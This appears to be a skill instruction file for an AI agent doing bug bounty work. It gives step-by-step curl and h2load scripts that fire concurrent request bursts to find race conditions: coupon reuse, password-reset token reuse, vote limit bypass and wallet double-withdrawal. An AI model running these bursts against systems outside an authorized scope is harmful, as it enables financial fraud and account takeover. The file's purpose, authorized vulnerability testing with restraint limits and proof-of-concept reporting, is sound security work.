---
name: race-condition-hunter
description: Systematically hunt for race condition vulnerabilities across an application's endpoints — limit bypass, double-spend, duplicate resource creation, TOCTOU, and concurrency flaws. Use this skill whenever recon reveals rate-limited actions, single-use tokens, transactional operations, balance/credit systems, or any endpoint where the outcome depends on shared state. Trigger on phrases like "test for race conditions", "race condition hunting", "concurrent request testing", "limit bypass", "double spend", or when hypothesis-agent flags a race condition hypothesis.
---

# Race Condition Hunter Skill

You are hunting race conditions. Race conditions are among the most under-reported and highest-impact bug classes in bug bounty — a single vulnerable endpoint can allow discount stacking, coupon reuse, balance manipulation, duplicate account creation, or complete limit bypass. They are missed because they require deliberate concurrency testing, not just sequential probing.

**Prime constraint:** Every race condition test sends multiple simultaneous requests to the target. Keep burst sizes reasonable (5–20 requests). Do not hammer endpoints with hundreds of concurrent requests — this is rate-limit testing, not a DoS. If a target has explicit rate-limit testing exclusions in scope, skip this skill.

---

## Phase 1 — Surface Identification

### Step 1.1 — Identify Race-Condition-Prone Endpoints

From existing recon output, flag endpoints that match high-risk patterns:

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/race

# Search for high-value race condition surface patterns
grep -iE \
  '(redeem|coupon|voucher|promo|discount|apply|claim|use|transfer|withdraw|purchase|
    checkout|order|payment|refund|invite|referral|vote|like|follow|unfollow|
    enroll|register|signup|verify|confirm|reset|token|otp|code|limit|quota|
    upload|submit|approve|reject|lock|unlock|assign|allocate|consume)' \
  $TARGET_DIR/recon/api/all-endpoints.txt \
  $TARGET_DIR/recon/api/high-interest.txt 2>/dev/null | \
  sort -u > $TARGET_DIR/recon/race/candidate-endpoints.txt

echo "[*] Race condition candidates: $(wc -l < $TARGET_DIR/recon/race/candidate-endpoints.txt)"
cat $TARGET_DIR/recon/race/candidate-endpoints.txt
```

### Step 1.2 — Classify by Race Condition Type

For each candidate endpoint, determine which race class it likely belongs to:

| Race Class | Endpoint Pattern | Impact |
|---|---|---|
| **Limit bypass** | Rate-limited actions: votes, likes, follows, submissions | Spam / manipulation |
| **Double-spend** | Payment, withdrawal, transfer, balance deduction | Financial loss |
| **Coupon/promo reuse** | redeem, apply, voucher, promo code | Revenue loss |
| **Duplicate resource** | register, create, enroll, invite | Logic bypass |
| **TOCTOU** | check-then-act: verify-then-use, read-then-write | Auth bypass, privilege escalation |
| **Single-use token** | OTP, reset token, email verify, invite link | Account takeover chain |
| **Time-of-check bypass** | Approval flows, KYC, 2FA, role assignment | Authorization bypass |

Save classification:
```bash
cat > $TARGET_DIR/recon/race/classification.txt << 'EOF'
# Race Condition Surface Classification
# Format: [TYPE] endpoint — notes
EOF
```

---

## Phase 2 — Tooling Setup

### Step 2.1 — Verify Tools

```bash
ssh user@$KALI_IP 'bash -s' << 'ENDSSH'
# Turbo Intruder (Burp extension) — primary tool, best for last-byte sync
which python3 && echo "Python3 OK"

# curl with parallel support
curl --version | grep -E '(curl|parallel)'

# GNU parallel for concurrent requests
which parallel && echo "parallel OK" || echo "parallel not found — install: sudo apt install parallel"

# ffuf for concurrent fuzzing (already checked in preflight)
which /home/kali/go/bin/ffuf && echo "ffuf OK"
ENDSSH
```

### Step 2.2 — Race Request Script

Create a reusable concurrent request sender on Kali:

```bash
ssh user@$KALI_IP 'bash -s' << 'ENDSSH'
cat > ~/tools/race-send.sh << 'SCRIPT'
#!/bin/bash
# Usage: race-send.sh <url> <method> <data> <cookies> <count>
# Sends <count> requests simultaneously using last-byte synchronization via curl

URL=$1
METHOD=$2
DATA=$3
COOKIES=$4
COUNT=${5:-10}

echo "[*] Sending $COUNT concurrent $METHOD requests to $URL"

for i in $(seq 1 $COUNT); do
  curl -sk -X "$METHOD" \
    -H "Content-Type: application/json" \
    -H "Cookie: $COOKIES" \
    -d "$DATA" \
    -w "\n[%{http_code}] %{time_total}s" \
    "$URL" &
done
wait
echo "[*] All requests complete"
SCRIPT
chmod +x ~/tools/race-send.sh
echo "[OK] race-send.sh created at ~/tools/race-send.sh"
ENDSSH
```

---

## Phase 3 — Race Condition Testing

### Step 3.1 — Baseline Request

Before any concurrent testing, establish a baseline:

```bash
# Capture exact request structure for the target endpoint
# Include all headers, cookies, CSRF tokens, and body parameters
TARGET_ENDPOINT="[endpoint from classification]"

curl -sk -v -X POST "$TARGET_ENDPOINT" \
  -H "Content-Type: application/json" \
  -H "Cookie: [session]" \
  -d '[body]' \
  2>&1 | tee $TARGET_DIR/recon/race/baseline-request.txt

echo "[*] Baseline response saved"
```

Note:
- **Response structure** — what does success look like vs. already-used/limit-exceeded?
- **State change** — does the server return a new state (balance, count, flag)?
- **Idempotency key** — does the request have a unique `X-Idempotency-Key` header? If yes, the server may be race-protected
- **CSRF token** — is a per-request token required? If yes, it must be pre-fetched for each concurrent request

### Step 3.2 — Single-Packet Attack (HTTP/2)

For HTTP/2-enabled targets, the single-packet attack sends all requests in one TCP frame, achieving true simultaneity. This is the most effective technique for server-side race conditions:

```bash
# Check if target supports HTTP/2
curl -sk --http2 -I "https://$TARGET_DOMAIN" | grep -i 'HTTP/2'

# If HTTP/2 supported — use Turbo Intruder (Burp) for single-packet attack
# Manual equivalent using h2load (if installed):
which h2load && \
  h2load -n 20 -c 1 -m 20 \
    --header="Content-Type: application/json" \
    --header="Cookie: [session]" \
    --data='[body]' \
    "$TARGET_ENDPOINT" 2>/dev/null | \
    grep -E '(status|req|min|max)'
```

**If Burp is available:** Use Turbo Intruder with the `race-single-packet-attack.py` template. This is the gold standard for HTTP/2 race conditions and is documented in [PortSwigger's research](https://portswigger.net/research/smashing-the-state-machine).

### Step 3.3 — Parallel Curl Attack (HTTP/1.1 fallback)

For HTTP/1.1 targets or when HTTP/2 is not available:

```bash
# Send N concurrent requests and collect all responses
COUNT=15
TARGET_ENDPOINT="[endpoint]"
SESSION_COOKIE="[cookie]"
BODY='[json body]'

echo "[*] Firing $COUNT concurrent requests..."

for i in $(seq 1 $COUNT); do
  curl -sk -X POST "$TARGET_ENDPOINT" \
    -H "Content-Type: application/json" \
    -H "Cookie: $SESSION_COOKIE" \
    -d "$BODY" \
    -w "\n[REQ-$i][%{http_code}] " \
    -o - 2>/dev/null &
done | tee $TARGET_DIR/recon/race/concurrent-responses.txt
wait

echo ""
echo "[*] Response summary:"
grep -oE '\[REQ-[0-9]+\]\[[0-9]+\]' $TARGET_DIR/recon/race/concurrent-responses.txt | sort
```

### Step 3.4 — Interpreting Results

**Positive race condition indicators:**

| Observation | Meaning |
|---|---|
| Multiple `200 OK` responses where only one should succeed | Race condition confirmed — action executed more than once |
| Duplicate resources created (check via GET after test) | State not properly locked |
| Balance/credit decremented multiple times | Double-spend confirmed |
| Coupon/token marked used multiple times | Single-use bypass confirmed |
| Different responses for same concurrent request (200 vs 409) | Server detected some races but not all |
| All responses identical (all succeed or all fail) | Likely race-safe, or try with more concurrency |

```bash
# Verify state after concurrent test
echo "[*] Checking post-race state:"
curl -sk -H "Cookie: $SESSION_COOKIE" \
  "https://$TARGET_DOMAIN/api/[state-endpoint]" | python3 -m json.tool
```

---

## Phase 4 — Class-Specific Test Playbooks

### Coupon / Promo Code Reuse

```bash
# Pre-requisite: valid coupon code that should be single-use
COUPON="SAVE20"
CHECKOUT_ENDPOINT="https://$TARGET_DOMAIN/api/checkout/apply-coupon"

# Apply the coupon 10 times simultaneously
for i in $(seq 1 10); do
  curl -sk -X POST "$CHECKOUT_ENDPOINT" \
    -H "Content-Type: application/json" \
    -H "Cookie: $SESSION_COOKIE" \
    -d "{\"coupon\": \"$COUPON\"}" \
    -w "[%{http_code}]" -o - &
done
wait

# Check: was discount applied multiple times to the order?
curl -sk -H "Cookie: $SESSION_COOKIE" \
  "https://$TARGET_DOMAIN/api/cart" | python3 -m json.tool
```

### Single-Use Token Reuse (Password Reset / OTP)

```bash
# Pre-requisite: valid single-use reset token or OTP
TOKEN="[token from email/SMS]"
RESET_ENDPOINT="https://$TARGET_DOMAIN/api/auth/reset-password"

# Submit the same token with the same new password concurrently
for i in $(seq 1 10); do
  curl -sk -X POST "$RESET_ENDPOINT" \
    -H "Content-Type: application/json" \
    -d "{\"token\": \"$TOKEN\", \"password\": \"NewPassword123!\"}" \
    -w "[%{http_code}]" -o - &
done
wait

# If multiple 200s returned: token was not atomically invalidated on first use
# Try to reuse the token sequentially after the race to confirm
curl -sk -X POST "$RESET_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "{\"token\": \"$TOKEN\", \"password\": \"AnotherPassword456!\"}" \
  -w "[%{http_code}]"
```

### Limit Bypass (Votes, Likes, Referrals)

```bash
ACTION_ENDPOINT="https://$TARGET_DOMAIN/api/posts/[id]/vote"

# Submit vote/like/follow 20 times simultaneously
for i in $(seq 1 20); do
  curl -sk -X POST "$ACTION_ENDPOINT" \
    -H "Cookie: $SESSION_COOKIE" \
    -w "[%{http_code}]" -o - &
done
wait

# Check count after race
curl -sk "https://$TARGET_DOMAIN/api/posts/[id]" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print('Vote count:', d.get('votes', d.get('likes', 'unknown')))"
```

### TOCTOU — Withdraw / Transfer

```bash
# Pre-requisite: account with known balance (e.g. $10)
# Attempt to withdraw full balance twice simultaneously
WITHDRAW_ENDPOINT="https://$TARGET_DOMAIN/api/wallet/withdraw"
AMOUNT="10.00"  # Full balance

for i in $(seq 1 5); do
  curl -sk -X POST "$WITHDRAW_ENDPOINT" \
    -H "Content-Type: application/json" \
    -H "Cookie: $SESSION_COOKIE" \
    -d "{\"amount\": $AMOUNT}" \
    -w "[%{http_code}]" -o - &
done
wait

# Check balance — should be 0 after one withdrawal, not negative
curl -sk -H "Cookie: $SESSION_COOKIE" \
  "https://$TARGET_DOMAIN/api/wallet/balance" | python3 -m json.tool
```

---

## Phase 5 — PoC Documentation

A race condition finding is only reportable with a confirmed, reproducible state change. Document exactly:

```bash
cat > $TARGET_DIR/findings/race-[endpoint-name].md << 'EOF'
# Race Condition: [Endpoint]

## Vulnerability
[One sentence: what operation, what protection is missing]

## Preconditions
- Account with [specific state: coupon in cart / balance of X / valid token]
- HTTP/2 support: [yes/no]
- Concurrent requests sent: [count]

## Proof of Concept

### Request (sent N times simultaneously)
```
POST /api/[endpoint] HTTP/1.1
Host: target.com
Cookie: [session]
Content-Type: application/json

{"param": "value"}
```

### Responses received
- Request 1: 200 OK — {"status": "success"}
- Request 2: 200 OK — {"status": "success"}   ← should have been rejected
- Request 3: 409 Conflict — {"error": "already used"}
...

### State verification (GET after race)
```
[Response showing the unexpected state — negative balance, double discount, etc.]
```

## Impact
An attacker can [specific action] resulting in [specific harm].

## Severity
[Critical/High/Medium — justify based on financial or account impact]
EOF
```

---

## Severity Reference

| Race Condition Class | Severity |
|---|---|
| Withdraw / transfer double-spend (real money) | Critical |
| Payment bypass / order total manipulation | Critical |
| Single-use token reuse enabling ATO | High |
| Coupon / promo code reuse (significant discount) | High |
| Referral / invite bonus abuse | Medium |
| Like / vote / rating manipulation | Low–Medium |
| Duplicate resource creation without financial impact | Low |

---

## Guiding Principles

- **State change is the only valid PoC.** A different HTTP status code is a hint, not a finding. The actual account state (balance, count, flag) must show the unexpected value after the race.
- **DoS is not the goal.** Keep concurrent request counts to 5–20. The goal is to trigger a logic flaw, not to overwhelm the server. High request counts are out of scope for most programs.
- **HTTP/2 single-packet attacks are categorically more effective.** If the target supports HTTP/2, use Turbo Intruder before concluding a race condition doesn't exist.
- **Idempotency keys are not always enforced server-side.** Even if the request has `X-Idempotency-Key`, test whether the server actually rejects duplicate keys under concurrent load.
- **Financial race conditions are Critical regardless of amount.** A $0.01 double-spend demonstrates the flaw — the impact is the pattern, not the test amount.
- **Run /triager before submitting.** Race condition PoCs must include the actual state change in the response. "Multiple 200s returned" without showing the resulting incorrect state will be N/A'd.
